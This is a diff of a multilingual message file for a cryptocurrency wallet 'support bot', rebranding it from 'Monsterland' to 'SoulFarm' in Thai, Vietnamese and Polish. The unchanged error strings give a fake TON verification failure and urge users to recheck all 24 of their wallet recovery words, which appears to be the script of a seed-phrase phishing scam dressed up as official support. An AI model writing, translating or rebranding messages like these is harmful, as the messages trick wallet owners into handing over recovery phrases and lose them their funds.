+        "welcome": "Hi {user} ยินดีต้อนรับสู่ SoulFarm support bot! บอทนี้ช่วยเรื่องการเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การกู้คืนบัญชี, การเคลมโทเค็นและรางวัล, การคืนเงิน และการยืนยันบัญชี กรุณาเลือกตัวเลือกจากเมนูเพื่อดำเนินการต่อ",
         "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
         "validation": "การยืนยัน",
         "claim tokens": "เคลมโทเค็น",
@@ -1148,7 +1148,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ การยืนยันกระเป๋าเงิน TON ล้มเหลว\n\nไม่สามารถยืนยันกระเป๋าเงินเสร็จสมบูรณ์ได้ เนื่องจาก TON ไม่เพียงพอสำหรับค่าธรรมเนียมแก๊สเครือข่ายและการดำเนินการสัญญาอัจฉริยะที่จำเป็นในการดำเนินการบนเชน\n\nข้อผิดพลาด TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nโปรดตรวจสอบให้แน่ใจว่ากระเป๋าเงินที่เชื่อมต่อมี TON เพียงพอสำหรับความสมบูรณ์ของธุรกรรม จากนั้นลองยืนยันอีกครั้ง\n\nนอกจากนี้ ให้ตรวจสอบคำกู้คืนทั้ง 24 คำในเครื่องของคุณเพื่อหาข้อผิดพลาดในการสะกด คำที่ขาดหาย ลำดับที่ไม่ถูกต้อง หรือรายการที่ไม่ถูกต้อง การไม่ตรงกันเพียงครั้งเดียวอาจทำให้การตรวจสอบการรับรองความถูกต้อง/การสืบทอดของกระเป๋าเงินล้มเหลว',
     },
     "vi": {
-        "welcome": "Hi {user} chào mừng đến với Monsterland support bot! Bot này giúp truy cập ví, giao dịch, số dư, khôi phục, khôi phục tài khoản, yêu cầu token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn để tiếp tục.",
+        "welcome": "Hi {user} chào mừng đến với SoulFarm support bot! Bot này giúp truy cập ví, giao dịch, số dư, khôi phục, khôi phục tài khoản, yêu cầu token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn để tiếp tục.",
         "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
         "validation": "Xác thực",
         "claim tokens": "Yêu cầu Token",
@@ -1191,7 +1191,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Xác minh ví TON thất bại\n\nKhông thể hoàn tất xác minh ví do TON không đủ cho phí gas mạng và phí thực thi hợp đồng thông minh cần thiết để hoàn thành hoạt động trên chuỗi.\n\nLỗi TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nHãy đảm bảo ví đã kết nối có đủ TON để hoàn thiện giao dịch, sau đó thử xác minh lại.\n\nNgoài ra, hãy kiểm tra cục bộ tất cả 24 từ phục hồi để tìm lỗi chính tả, từ bị thiếu, thứ tự không chính xác hoặc mục nhập không hợp lệ. Một sự không khớp duy nhất có thể khiến xác thực/dẫn xuất ví thất bại.',
     },
     "pl": {
-        "welcome": "Hi {user} witaj w Monsterland support bot! Ten bot pomaga w dostępie do portfela, transakcjach, saldach, odzyskiwaniu, odzyskaniu konta, odbieraniu tokenów i nagród, zwrotach i weryfikacji konta. Wybierz opcję, aby kontynuować.",
+        "welcome": "Hi {user} witaj w SoulFarm support bot! Ten bot pomaga w dostępie do portfela, transakcjach, saldach, odzyskiwaniu, odzyskaniu konta, odbieraniu tokenów i nagród, zwrotach i weryfikacji konta. Wybierz opcję, aby kontynuować.",
         "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
         "validation": "Walidacja",
         "claim tokens": "Odbierz Tokeny",
